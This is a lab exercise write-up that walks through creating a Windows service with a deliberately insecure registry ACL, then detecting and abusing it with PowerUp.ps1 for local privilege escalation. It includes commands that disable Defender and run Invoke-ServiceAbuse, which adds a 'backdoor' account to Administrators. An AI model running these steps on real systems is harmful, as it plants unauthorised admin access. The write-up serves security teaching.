# Exercise 2: Write a PS Script That Installs an Insecure Windows Service

---

## Objectives
- Understand how a Windows service with weak/insecure permissions on its registry key can be abused for local privilege escalation.
- Practice creating a deliberately misconfigured service in a lab environment, then using a known privilege-escalation enumeration tool to detect and abuse it.
- Confirm privilege escalation by validating that a newly created account was added to the local Administrators group.

---

## Tools
- **Dev-C++** — used to compile a harmless placeholder executable (a "dummy" program that just displays a message box) to act as the service binary.
- **PowerShell** (run as Administrator) — used to create the service and modify its registry permissions.
- **PowerUp.ps1** (PowerSploit's Privesc module) — a public, well-known Windows privilege-escalation enumeration/exploitation script, used to detect and abuse the misconfigured service.
- **Windows 10/11 VM** — isolated lab target with Administrator access.

--

## Files Used: 

[Download the folder: solution_1](./Documentation/)

- `dummymalware.cpp` / `dummymalware.exe` — placeholder service binary compiled in Dev-C++.
- `insecureservice.ps1` — PowerShell script that creates the misconfigured service.
- `PowerUp.ps1` — PowerSploit's Privesc enumeration/exploitation script.

---

## Steps
1. Compiled a placeholder ("dummy") executable in Dev-C++ (`dummymalware.cpp` → `dummymalware.exe`) and placed it in `C:\Windows\System32\` to act as the target service's binary — it performs no harmful action, it only displays a message box, and exists purely so the service has something to point to.
2. Wrote a PowerShell script (`insecureservice.ps1`) that:
   - Registers a new Windows service pointing at the placeholder executable.
   - Intentionally grants an overly permissive registry ACL (`FullControl` for the `Everyone` group) on the service's registry key, recreating a real-world misconfiguration.
3. Ran the script as Administrator to create the service, then confirmed it existed with `Get-Service`.
   ```bash
   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
   cd C:\Users\<username>\Desktop
   .\insecureservice.ps1
   Get-Service -Name InsecureService
   ```
   
4. Prepared `PowerUp.ps1` for use: temporarily disabled real-time protection in the isolated lab VM (since Defender flags privilege-escalation tooling), downloaded it from PowerSploit's Privesc folder, and imported it as a PowerShell module.
    ```bash
   Import-Module .\PowerUp.ps1
   ```
    
5. Used PowerUp.ps1's enumeration functions to identify the misconfigured service and confirm it was modifiable by a low-privileged user.
   ```bash
   Get-ModifiableServiceFile
   Get-ServiceDetail -Name "InsecureService"
   ```
6. Used PowerUp.ps1's built-in abuse function against the vulnerable service to demonstrate that a low-privileged user could leverage it to create a new local account and add that account to the Administrators group.
   ```bash
   Invoke-ServiceAbuse -Name InsecureService -UserName backdoor -Password password -LocalGroup "Administrators"
   ```
   
   This runs: net user backdoor password /add && net localgroup Administrators backdoor /add

7. Validated the result with `net user <account>`, confirming the account was active and listed under the Administrators group — proving privilege escalation via the insecure service.
   ```bash
   net user backdoor
   ```
8. Cleanup (optional, after recording)
```bash
sc.exe delete InsecureService
```

---

## My Solution:

[View My Solution:](https://youtu.be/UA4oTwfJ3IY)

---
